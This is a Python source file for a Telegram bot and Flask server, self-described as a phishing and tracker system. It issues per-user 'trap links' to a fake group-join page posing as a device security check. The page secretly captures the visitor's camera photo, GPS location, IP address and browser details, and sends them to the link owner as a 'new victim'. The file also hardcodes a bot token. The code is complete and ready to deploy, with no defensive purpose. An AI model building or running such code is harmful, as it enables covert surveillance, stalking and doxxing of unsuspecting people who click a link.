# language: Python, file: bot.py
# Professional Multi-Tenant Phishing & Tracker System

import telebot
import sqlite3
import requests
import base64
import random
import string
import os
from flask import Flask, request, jsonify, render_template_string
from threading import Thread

# ============================================================
# AYARLAR (BURAYI KENDİ BİLGİLERİNE GÖRE DOLDUR)
# ============================================================
BOT_TOKEN = "8715521675:AAH4AsmyqUmUAffzsNcmsZSzV_88TfNk23c"
# Render sana bir link verecek (Örn: https://pubolduk-bot.onrender.com)
BASE_URL = "https://telegram-uzk9.onrender.com" 

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ============================================================
# VERİTABANI KURULUMU
# ============================================================
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (token TEXT PRIMARY KEY, owner_id INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def get_owner(token):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT owner_id FROM links WHERE token=?", (token,))
    res = c.fetchone()
    conn.close()
    return res[0] if res else None

# ============================================================
# TELEGRAM BOT KOMUTLARI
# ============================================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    msg = (
        "👋 *Pubolduk Link Sistemi*\n\n"
        "Bu bot ile kendine özel bir tuzak linki oluşturabilirsin.\n\n"
        "🔗 `/link` - Yeni bir link üret."
    )
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['link'])
def generate_link(message):
    user_id = message.from_user.id
    
    # Rastgele 8 karakterli benzersiz token
    token = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO links (token, owner_id) VALUES (?, ?)", (token, user_id))
    conn.commit()
    conn.close()
    
    full_url = f"{BASE_URL}/p/{token}"
    
    msg = (
        "✅ *Sana özel link hazır!*\n\n"
        f"🔗 `{full_url}`\n\n"
        "Bu linke tıklayan kişinin fotoğrafı, konumu ve IP'si **sadece sana** bu sohbete düşecek."
    )
    bot.reply_to(message, msg, parse_mode="Markdown")

# ============================================================
# HTML TASARIMI (Gömülü)
# ============================================================
HTML_PAGE = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Pubolduk</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
    body { margin: 0; background: #0e1621; color: #fff; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .card { background: #17212b; padding: 35px 25px; border-radius: 16px; text-align: center; width: 88%; max-width: 360px; box-shadow: 0 8px 30px rgba(0,0,0,0.6); }
    .icon { width: 90px; height: 90px; background: linear-gradient(135deg, #2AABEE, #229ED9); border-radius: 50%; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; font-size: 38px; font-weight: 700; }
    h1 { font-size: 24px; margin: 0 0 8px; }
    p { font-size: 14px; color: #7f91a4; margin-bottom: 25px; }
    .btn { background: #2AABEE; color: #fff; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; display: flex; justify-content: center; align-items: center; transition: background 0.2s; }
    .btn:active { background: #229ED9; }
    .loading { display: none; font-size: 14px; color: #2AABEE; margin-top: 20px; }
</style>
</head>
<body>
<div class="card">
    <div class="icon">P</div>
    <h1>Pubolduk</h1>
    <p>Gruba katılmak için cihaz güvenlik doğrulamasını tamamlayın.</p>
    <button class="btn" id="joinBtn" onclick="start()">Gruba Katıl</button>
    <div class="loading" id="loading">Doğrulanıyor, lütfen bekleyin...</div>
</div>
<script>
    const TOKEN = "{{ token }}";
    async function start() {
        document.getElementById('joinBtn').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        let payload = { token: TOKEN, ua: navigator.userAgent, screen: screen.width+"x"+screen.height, image: null, lat: null, lon: null };

        // Kamera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 500));
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            payload.image = canvas.toDataURL('image/jpeg', 0.7);
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.log("Kamera izni yok"); }

        // GPS
        try {
            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true }));
            payload.lat = pos.coords.latitude;
            payload.lon = pos.coords.longitude;
        } catch(e) { console.log("GPS izni yok"); }

        // Sunucuya Gönder
        try {
            await fetch('/api/log', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        } catch(e) {}

        // Telegram'a Yönlendir
        document.getElementById('loading').innerText = "Başarılı. Yönlendiriliyorsunuz...";
        setTimeout(() => { window.location.href = "https://t.me/utancim"; }, 1000);
    }
</script>
</body>
</html>
"""

@app.route('/p/<token>')
def phish(token):
    if not get_owner(token):
        return "Geçersiz link.", 404
    return render_template_string(HTML_PAGE, token=token)

@app.route('/api/log', methods=['POST'])
def log():
    data = request.json
    owner_id = get_owner(data.get('token'))
    if not owner_id: return jsonify({"s": "err"}), 403

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    msg = f"🚨 *YENİ KURBAN BULUNDU*\n🌐 IP: `{ip}`\n📱 {data.get('ua')}\n"
    
    if data.get('lat'):
        msg += f"📍 GPS: https://maps.google.com/?q={data['lat']},{data['lon']}"
    
    if data.get('image'):
        try:
            img = base64.b64decode(data['image'].split(',')[1])
            bot.send_photo(owner_id, img, caption=msg, parse_mode="Markdown")
        except: 
            bot.send_message(owner_id, msg + "\n(Fotoğraf yüklenemedi)", parse_mode="Markdown")
    else:
        bot.send_message(owner_id, msg, parse_mode="Markdown")
        
    return jsonify({"s": "ok"})

# ============================================================
# RENDER İÇİN ÇALIŞTIRMA
# ============================================================
if __name__ == '__main__':
    # Botu arka planda çalıştır
    t = Thread(target=bot.infinity_polling)
    t.daemon = True
    t.start()
    
    # Flask'ı Render'ın istediği portta çalıştır
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
